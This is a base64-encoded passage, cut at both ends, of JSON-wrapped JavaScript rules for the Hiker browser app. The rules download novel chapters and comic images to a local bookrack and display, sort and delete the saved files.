gZmV0Y2goaXRlbS51cmwpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCBnZXRDb250ZW50ID0gbmV3IEZ1bmN0aW9uKFxcXFxcXFwiaW5wdXRcXFxcXFxcIiwgXFxcXFxcXCJ1cmxcXFxcXFxcIiwgXFxcXFxcXCJpbmRleFxcXFxcXFwiLCBcXFxcXFxcInRpdGxlXFxcXFxcXCIsIFxcXFxcXFwic2V0UmVzdWx0XFxcXFxcXCIsIFxcXFxcXFwiZ2V0UmVzQ29kZVxcXFxcXFwiLCBcXFxcXFxcInJldHVybiBcXFxcXFxcIiArIGluZm8ucGFyc2VDb2RlKTtcXFxcbiAgICAgICAgY29udGVudCA9IGdldENvbnRlbnQoaXRlbS51cmwsIGl0ZW0udXJsLCBvcmRlciwgaXRlbS50aXRsZSwgc2V0UmVzdWx0LCBnZXRSZXNDb2RlKSB8fCBjb250ZW50IHx8IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBlLm1lc3NhZ2UgPSBcXFxcXFxcIjzlsI/or7TmraPmlofop6PmnpDplJnor68+IFxcXFxcXFwiICsgZS5tZXNzYWdlO1xcXFxuICAgICAgICB0aHJvdyBlO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoIWNvbnRlbnQpIHtcXFxcbiAgICAgICAgdG9hc3QoXFxcXFxcXCLlsI/or7TkuLrnqbpcXFxcXFxcIik7XFxcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIjzlsI/or7TmraPmlofop6PmnpDplJnor6/vvJrmraPmlofov5Tlm57kuLrnqbo+XFxcXFxcXCIpO1xcXFxuICAgIH1cXFxcbiAgICBpZiAoaW5mby5ib29rVG9wUGljKSB7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBsZXQgYm9va1RvcFBpYyA9IFRvb2wuaGlrZXJQaWMoaW5mby5ib29rVG9wUGljKTtcXFxcbiAgICAgICAgICAgIFRvb2wucGljRG93bmxvYWQoYm9va1RvcFBpY1swXSwgbWFpblBhdGggKyBpbmZvLmJvb2tOYW1lICsgaWQgKyBcXFxcXFxcIi5qcGdcXFxcXFxcIiwgYm9va1RvcFBpY1sxXSwgaW5mby5kZWNvZGUpO1xcXFxuXFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhcXFxcXFxcIjzlsIHpnaLkuIvovb3plJnor68+IFxcXFxcXFwiICsgZS5tZXNzYWdlKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBGaWxlLmZpbGVXcml0ZShjaGFwdGVyUGF0aCwgY29udGVudC5yZXBsYWNlKC88c2NyaXB0Pi4qPzxcXFxcXFxcXC9zY3JpcHQ+L2dtaSwgXFxcXFxcXCJcXFxcXFxcIikudHJpbVJpZ2h0KCkpO1xcXFxuICAgIC8vRmlsZS5yZW5hbWVGaWxlKGNoYXB0ZXJQYXRoLCBvcmRlciArIFxcXFxcXFwiJEEkXFxcXFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcXFxcXCIudHh0XFxcXFxcXCIpO1xcXFxufVxcXFxuXFxcXG4kLmV4cG9ydHMuY29taWMgPSBmdW5jdGlvbiBjb21pYyhpdGVtLCBpbmZvLCBvcmRlciwgTVlfSUQsIGludGVycnVwdCkge1xcXFxuICAgIGxldCBpZCA9IGluZm8uYm9va0lkID8gXFxcXFxcXCIkXFxcXFxcXCIgKyBpbmZvLmJvb2tJZCA6IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgbGV0IG1haW5QYXRoID0gQ29uZmlnLmNvbWljUGF0aCArIFxcXFxcXFwiL1xcXFxcXFwiICsgaW5mby5ydWxlTmFtZSArIFxcXFxcXFwiL1xcXFxcXFwiICsgVG9vbC50ZXh0U2hpZWxkKGluZm8uYm9va05hbWUpICsgaWQgKyBcXFxcXFxcIi9cXFxcXFxcIjtcXFxcbiAgICBsZXQgY2hhcHRlclBhdGggPSBtYWluUGF0aCArIG9yZGVyICsgXFxcXFxcXCIkQiRcXFxcXFxcIiArIFRvb2wudGV4dFNoaWVsZChpdGVtLnRpdGxlKSArIFxcXFxcXFwiL1xcXFxcXFwiO1xcXFxuICAgIGxldCBwaWNMaXN0ID0gW107XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgbGV0IGdldFBpY0xpc3QgPSBuZXcgRnVuY3Rpb24oXFxcXFxcXCJpbnB1dFxcXFxcXFwiLCBcXFxcXFxcInVybFxcXFxcXFwiLCBcXFxcXFxcImluZGV4XFxcXFxcXCIsIFxcXFxcXFwidGl0bGVcXFxcXFxcIiwgXFxcXFxcXCJyZXR1cm5cXFxcXFxcIiArIGluZm8ucGFyc2VDb2RlKTtcXFxcbiAgICAgICAgcGljTGlzdCA9IGdldFBpY0xpc3QoaXRlbS51cmwsIGl0ZW0udXJsLCBvcmRlciwgaXRlbS50aXRsZSk7XFxcXG4gICAgICAgIGlmICh0eXBlb2YgcGljTGlzdCA9PT0gXFxcXFxcXCJzdHJpbmdcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgcGljTGlzdCA9IHBpY0xpc3QucmVwbGFjZShcXFxcXFxcInBpY3M6Ly9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikuc3BsaXQoXFxcXFxcXCImJlxcXFxcXFwiKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgZS5tZXNzYWdlID0gXFxcXFxcXCI85ryr55S75Zu+54mH6Kej5p6Q6ZSZ6K+vPiBcXFxcXFxcIiArIGUubWVzc2FnZTtcXFxcbiAgICAgICAgdGhyb3cgZTtcXFxcbiAgICB9XFxcXG4gICAgcGljTGlzdCA9IHBpY0xpc3QuZmlsdGVyKHAgPT4gcCk7XFxcXG4gICAgY29uc3QgTCA9IHBpY0xpc3QubGVuZ3RoO1xcXFxuICAgIGlmIChMID09PSAwKSB7XFxcXG4gICAgICAgIHRvYXN0KFxcXFxcXFwi5Zu+54mH6ZO+5o6l5Li656m6XFxcXFxcXCIpO1xcXFxuICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCI85ryr55S75Zu+54mH6Kej5p6Q6ZSZ6K+v77ya5Zu+54mH6ZO+5o6l6L+U5Zue5Li656m6PlxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGluZm8uYm9va1RvcFBpYykge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgbGV0IGJvb2tUb3BQaWMgPSBUb29sLmhpa2VyUGljKGluZm8uYm9va1RvcFBpYyk7XFxcXG4gICAgICAgICAgICBUb29sLnBpY0Rvd25sb2FkKGJvb2tUb3BQaWNbMF0sIG1haW5QYXRoICsgaW5mby5ib29rTmFtZSArIGlkICsgXFxcXFxcXCIuanBnXFxcXFxcXCIsIGJvb2tUb3BQaWNbMV0sIGluZm8uZGVjb2RlKTtcXFxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwiPOWwgemdouS4i+i9vemUmeivrz4gXFxcXFxcXCIgKyBlLm1lc3NhZ2UpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgbGV0IGVycm9yTnVtID0gMDtcXFxcbiAgICBmb3IgKHZhciBpID0gMDsgaSA8IEw7IGkrKykge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgbGV0IHBpYyA9IFRvb2wuaGlrZXJQaWMocGljTGlzdFtpXSk7XFxcXG4gICAgICAgICAgICBUb29sLnBpY0Rvd25sb2FkKHBpY1swXSwgY2hhcHRlclBhdGggKyAoaSArIDEpICsgXFxcXFxcXCIuanBnXFxcXFxcXCIsIHBpY1sxXSwgaW5mby5kZWNvZGUpO1xcXFxuICAgICAgICAgICAgaWYgKGludGVycnVwdCAmJiBnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOnN0YXR1c1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBlcnJvck51bSA9IDA7XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGlmIChlcnJvck51bSA8IDEwKSB7XFxcXG4gICAgICAgICAgICAgICAgaS0tO1xcXFxuICAgICAgICAgICAgICAgIGVycm9yTnVtKys7XFxcXG4gICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHRocm93IGU7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG5cXFxcbiAgICBGaWxlLnJlbmFtZUZpbGUoY2hhcHRlclBhdGgsIG9yZGVyICsgXFxcXFxcXCIkQSRcXFxcXFxcIiArIFRvb2wudGV4dFNoaWVsZChpdGVtLnRpdGxlKSk7XFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5ryr55S75YW85a65XFxcIixcXFwicGF0aFxcXCI6XFxcImNvbWljQ29tcGF0aWJsZS52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuc2V0UGFnZVRpdGxlKE1ZX1BBUkFNUy50aXRsZSk7XFxcXG5sZXQgcGF0aD1kZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJwYXRoXFxcXFxcXCIsTVlfUEFSQU1TLnBhdGgpKTtcXFxcbmxldCBmaWxlbGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCk7XFxcXG5sZXQgcGljbGlzdCA9IGZpbGVsaXN0Lm1hcCgoaXRlbSwgaSkgPT4gKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJwaWNfMV9mdWxsXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICBwaWNfdXJsOiBwYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyAoaSArIDEpICsgXFxcXFxcXCIuanBnXFxcXFxcXCJcXFxcbn0pKTtcXFxcblxcXFxuc2V0UmVzdWx0KHBpY2xpc3QpO1xcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu5Lmm5p62XFxcIixcXFwicGF0aFxcXCI6XFxcIkJvb2tyYWNrLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiRmlsZS5qc1xcXFxcXFwiKTtcXFxcbmNvbnN0IHJhbmsgPSAkLnJlcXVpcmUoXFxcXFxcXCJmaWxlUmFuay5qc1xcXFxcXFwiKTtcXFxcbmNvbnN0IFRvb2wgPSAkLnJlcXVpcmUoXFxcXFxcXCJUb29sLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG4oZnVuY3Rpb24oKSB7XFxcXG4gICAgbGV0IHR5cGUgPSBNWV9QQVJBTVMudHlwZSB8fCBnZXRQYXJhbShcXFxcXFxcInR5cGVcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikgfHwgXFxcXFxcXCJjb21pY1xcXFxcXFwiO1xcXFxuICAgIGxldCBydWxlTmFtZSA9IFRvb2wudGV4dFNoaWVsZChNWV9QQVJBTVMucnVsZU5hbWUgfHwgZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXFxcXFwicnVsZU5hbWVcXFxcXFxcIikpKTtcXFxcbiAgICBpZiAoIXJ1bGVOYW1lKSB7XFxcXG4gICAgICAgIHRvYXN0KFxcXFxcXFwi6K+35Lyg5YWl6KeE5YiZ5ZCNXFxcXFxcXCIpO1xcXFxuICAgICAgICBiYWNrKGZhbHNlKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKCFbXFxcXFxcXCJjb21pY1xcXFxcXFwiLCBcXFxcXFxcIm5vdmVsXFxcXFxcXCJdLmluY2x1ZGVzKHR5cGUpKSB7XFxcXG4gICAgICAgIHRvYXN0KFxcXFxcXFwi6K+35Lyg5YWl5q2j56Gu55qEdHlwZTpjb21pYyBub3ZlbFxcXFxcXFwiKTtcXFxcbiAgICAgICAgYmFjayhmYWxzZSk7XFxcXG4gICAgfVxcXFxuICAgIHNldFBhZ2VUaXRsZShydWxlTmFtZSArIFxcXFxcXFwifOacrOWcsOS5puaetlxcXFxcXFwiKTtcXFxcbiAgICBsZXQgbGF5b3V0ID0gW107XFxcXG4gICAgbGV0IHBhdGggPSBDb25maWdbdHlwZSArIFxcXFxcXFwiUGF0aFxcXFxcXFwiXSArIHJ1bGVOYW1lO1xcXFxuICAgIGxldCBjb2xfdHlwZSA9IGdldEl0ZW0oXFxcXFxcXCJib29rcmFjazpjb2xfdHlwZVxcXFxcXFwiLCBcXFxcXFxcIm1vdmllXzNfbWFycXVlZVxcXFxcXFwiKTtcXFxcbiAgICBsZXQgcmFua01ldGhvZCA9IGdldEl0ZW0oXFxcXFxcXCJib29rcmFjazpyYW5rTWV0aG9kXFxcXFxcXCIsIFxcXFxcXFwi57O757ufXFxcXFxcXCIpO1xcXFxuICAgIGxldCByYW5rSXNSZXZlcnNlID0gZ2V0SXRlbShcXFxcXFxcImJvb2tyYWNrOnJhbmtJc1JldmVyc2VcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG5cXFxcbiAgICBsZXQgY29sVHlwZXMgPSBbXFxcXFxcXCJtb3ZpZV8xXFxcXFxcXCIsIFxcXFxcXFwibW92aWVfMlxcXFxcXFwiLCBcXFxcXFxcIm1vdmllXzNfbWFycXVlZVxcXFxcXFwiLCBcXFxcXFxcIm1vdmllXzFfdmVydGljYWxfcGljXFxcXFxcXCIsIFxcXFxcXFwicGljXzJcXFxcXFxcIiwgXFxcXFxcXCJwaWNfM1xcXFxcXFwiLCBcXFxcXFxcInBpY18zX3NxdWFyZVxcXFxcXFwiLCBcXFxcXFxcInBpY18yX2NhcmRcXFxcXFxcIl07XFxcXG4gICAgXFxcXG4gICAgbGV0IHJhbmtNZXRob2RzID0gW1xcXFxcXFwi57O757ufXFxcXFxcXCIsIFxcXFxcXFwi5aSn5bCPXFxcXFxcXCIsIFxcXFxcXFwi5ZCN56ewXFxcXFxcXCIsIFxcXFxcXFwi5pe26Ze0XFxcXFxcXCJdO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdXJsOiAnXFxcXFxcXCJoaWtlcjovL3NlYXJjaD9zPVxcXFxcXFwiK2lucHV0JyxcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCLmkJzkvaDmg7PopoHnmoQjXFxcXFxcXCIgKyB0eXBlICsgXFxcXFxcXCIjLi4uLi4uXFxcXFxcXCIsXFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIvCflI1cXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIHJ1bGVzOiAkLnRvU3RyaW5nKChydWxlTmFtZSwgdHlwZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBhcnIxID0gW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXFxcXFwidGl0bGVcXFxcXFxcIjogcnVsZU5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInNlYXJjaF91cmxcXFxcXFxcIjogXFxcXFxcXCJoaWtlcjovL2VtcHR5P2lzQWxsPTEmc2VhcmNoVGVybXM9KiomdHlwZT1cXFxcXFxcIiArIHR5cGUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInNlYXJjaEZpbmRcXFxcXFxcIjogXFxcXFxcXCJqczokLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9TZWFyY2gudmlldz9ydWxlPScrTVlfUlVMRS5fdGl0bGUpO1xcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH1dO1xcXFxuICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShhcnIxKTtcXFxcbiAgICAgICAgICAgIH0sIHJ1bGVOYW1lLCB0eXBlKSxcXFxcbiAgICAgICAgICAgIC8qZGVmYXVsdFZhbHVlOiBnZXRNeVZhcignc2VhcmNoS2V5JywgJycpLFxcXFxuICAgICAgICAgICAgb25DaGFuZ2U6IFxcXFxcXFwicHV0TXlWYXIoJ3NlYXJjaEtleScsaW5wdXQpXFxcXFxcXCIqL1xcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG5cXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIvCfp6lcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiZmxleF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKGNvbFR5cGVzLm1hcCh2PT52PT09Y29sX3R5cGU/XFxcXFxcXCLigJzigJxcXFxcXFxcIit2K1xcXFxcXFwi4oCd4oCdXFxcXFxcXCI6dikpLnNlbGVjdCgobmFtZSkgPT4ge1xcXFxuICAgICAgICAgICAgaWYoL+KAnOKAnC4qP+KAneKAnS8udGVzdChpbnB1dCkpIHJldHVybjtcXFxcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcXFxcXCJib29rcmFjazpjb2xfdHlwZVxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICB9KVxcXFxuICAgIH0pO1xcXFxuICAgIGZvciAobGV0IG5hbWUgb2YgcmFua01ldGhvZHMpIHtcXFxcbiAgICAgICAgbGV0IGEgPSByYW5rTWV0aG9kID09PSBuYW1lO1xcXFxuICAgICAgICBsZXQgdGl0bGVhID0gYSA/IFxcXFxcXFwi4oCY4oCYXFxcXFxcXCIgKyBuYW1lICsgXFxcXFxcXCLigJnigJlcXFxcXFxcIiA6IG5hbWU7XFxcXG4gICAgICAgIGxldCB0aXRsZWIgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICBpZiAoYSkge1xcXFxuICAgICAgICAgICAgdGl0bGViID0gIXJhbmtJc1JldmVyc2UgPyBcXFxcXFxcIuKGk1xcXFxcXFwiIDogXFxcXFxcXCLihpFcXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHRpdGxlYiA9IFxcXFxcXFwi4oaVXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlYSArIHRpdGxlYixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImZsZXhfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgobmFtZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCByYW5rTWV0aG9kID0gZ2V0SXRlbShcXFxcXFxcImJvb2tyYWNrOnJhbmtNZXRob2RcXFxcXFxcIiwgXFxcXFxcXCLns7vnu59cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJhbmtJc1JldmVyc2UgPSBnZXRJdGVtKFxcXFxcXFwiYm9va3JhY2s6cmFua0lzUmV2ZXJzZVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIGlmIChyYW5rTWV0aG9kID09PSBuYW1lKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChyYW5rSXNSZXZlcnNlKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByYW5rSXNSZXZlcnNlID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhbmtJc1JldmVyc2UgPSBcXFxcXFxcIjFcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcXFxcXCJib29rcmFjazpyYW5rSXNSZXZlcnNlXFxcXFxcXCIsIHJhbmtJc1JldmVyc2UpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcXFxcXCJib29rcmFjazpyYW5rSXNSZXZlcnNlXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwiYm9va3JhY2s6cmFua01ldGhvZFxcXFxcXFwiLCBuYW1lKTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSwgbmFtZSlcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIGxldCByYW5rTWV0aG9kTWFwID0ge1xcXFxuICAgICAgICBcXFxcXFxcIuezu+e7n1xcXFxcXFwiOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcIuWkp+Wwj1xcXFxcXFwiOiBcXFxcXFxcInNpemVcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCLlkI3np7BcXFxcXFxcIjogXFxcXFxcXCJuYW1lXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwi5pe26Ze0XFxcXFxcXCI6IFxcXFxcXFwidGltZVxcXFxcXFwiXFxcXG4gICAgfTtcXFxcbiAgICBsZXQgYm9va0xpc3QgPSBbXTtcXFxcbiAgICBsZXQgbGlzdCA9IHJhbmsoRmlsZS5nZXRGaWxlcyhwYXRoLCBcXFxcXFxcImRpclxcXFxcXFwiKSwgcmFua01ldGhvZE1hcFtyYW5rTWV0aG9kXSk7XFxcXG4gICAgaWYgKGxpc3QubGVuZ3RoID09PSAwKSB7XFxcXG4gICAgICAgIGJvb2tMaXN0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIuWVpemDveayoeacieiAtlxcXFxcXFwiLmJpZygpLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuXFxcXG4gICAgfVxcXFxuICAgIGxldCBwYWdlVXJsID0gdHlwZSA9PT0gXFxcXFxcXCJub3ZlbFxcXFxcXFwiID8gXFxcXFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxCcm93c2VyLnZpZXdcXFxcXFxcIiA6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbWljQnJvd3Nlci52aWV3XFxcXFxcXCI7XFxcXG4gICAgZm9yIChsZXQgaXRlbSBvZiBsaXN0KSB7XFxcXG4gICAgICAgIGxldCBwaWMgPSBmaWxlRXhpc3QoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBpdGVtLmdldFBhdGgoKSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaXRlbS5nZXROYW1lKCkgKyBcXFxcXFxcIi5qcGdcXFxcXFxcIikgPyBpdGVtLmdldFBhdGgoKSArIFxcXFxcXFwiL1xcXFxcXFwiICsgaXRlbS5nZXROYW1lKCkgKyBcXFxcXFxcIi5qcGdcXFxcXFxcIiA6IENvbmZpZy5kZWZfUGljO1xcXFxuICAgICAgICBsZXQgbmFtZXM9U3RyaW5nKGl0ZW0uZ2V0TmFtZSgpKS5zcGxpdChcXFxcXFxcIiRcXFxcXFxcIik7XFxcXG4gICAgICAgIGJvb2tMaXN0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IG5hbWVzWzBdLFxcXFxuICAgICAgICAgICAgZGVzYzogbmFtZXNbMV0sXFxcXG4gICAgICAgICAgICBwaWNfdXJsOiBwaWMsXFxcXG4gICAgICAgICAgICB1cmw6IHR5cGUgPT09IFxcXFxcXFwibm92ZWxcXFxcXFxcIiA/cGFnZVVybCArIFxcXFxcXFwiP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLnRpdGxlOiQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgocGFnZVVybCwgcGF0aCk9PntcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwibG9uZ1ByZXNzLmpzXFxcXFxcXCIpLnNpbmdsZUVudGVyKHBhZ2VVcmwsIHBhdGgpO1xcXFxuICAgICAgICAgICAgfSwgcGFnZVVybCwgaXRlbS5nZXRQYXRoKCkpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6Y29sX3R5cGUsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yig6ZmkXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChwYXRoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwibG9uZ1ByZXNzLmpzXFxcXFxcXCIpLmRlbGV0ZUZpbGVGb3JCb29rKHBhdGgpO1xcXFxuICAgICAgICAgICAgICAgICAgICB9LCBpdGVtLmdldFBhdGgoKSlcXFxcbiAgICAgICAgICAgICAgICB9XSxcXFxcbiAgICAgICAgICAgICAgICBpZDogaXRlbS5nZXRQYXRoKCksXFxcXG4gICAgICAgICAgICAgICAgcGF0aDogaXRlbS5nZXRQYXRoKCksXFxcXG4gICAgICAgICAgICAgICAgbmFtZTogaXRlbS5nZXROYW1lKClcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIGlmIChyYW5rSXNSZXZlcnNlKSB7XFxcXG4gICAgICAgIGJvb2tMaXN0LnJldmVyc2UoKTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBzZXRSZXN1bHQobGF5b3V0LmNvbmNhdChib29rTGlzdCkpO1xcXFxufSkoKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjZi7mlofku7bmjpLluo9cXFwiLFxcXCJwYXRoXFxcIjpcXFwiZmlsZVJhbmsuanNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiRmlsZS5qc1xcXFxcXFwiKTtcXFxcbmxldCBjaG5OdW1DaGFyID0ge1xcXFxuICAgIOmbtjogMCxcXFxcbiAgICDkuIA6IDEsXFxcXG4gICAg5LqMOiAyLFxcXFxuICAgIOS4iTogMyxcXFxcbiAgICDlm5s6IDQsXFxcXG4gICAg5LqUOiA1LFxcXFxuICAgIOWFrTogNixcXFxcbiAgICDkuIM6IDcsXFxcXG4gICAg5YWrOiA4LFxcXFxuICAgIOS5nTogOVxcXFxufTtcXFxcblxcXFxubGV0IGNobk5hbWVWYWx1ZSA9IHtcXFxcbiAgICDljYE6IHtcXFxcbiAgICAgICAgdmFsdWU6IDEwLFxcXFxuICAgICAgICBzZWNVbml0OiBmYWxzZVxcXFxuICAgIH0sXFxcXG4gICAg55m+OiB7XFxcXG4gICAgICAgIHZhbHVlOiAxMDAsXFxcXG4gICAgICAgIHNlY1VuaXQ6IGZhbHNlXFxcXG4gICAgfSxcXFxcbiAgICDljYM6IHtcXFxcbiAgICAgICAgdmFsdWU6IDEwMDAsXFxcXG4gICAgICAgIHNlY1VuaXQ6IGZhbHNlXFxcXG4gICAgfSxcXFxcbiAgICDkuIc6IHtcXFxcbiAgICAgICAgdmFsdWU6IDEwMDAwLFxcXFxu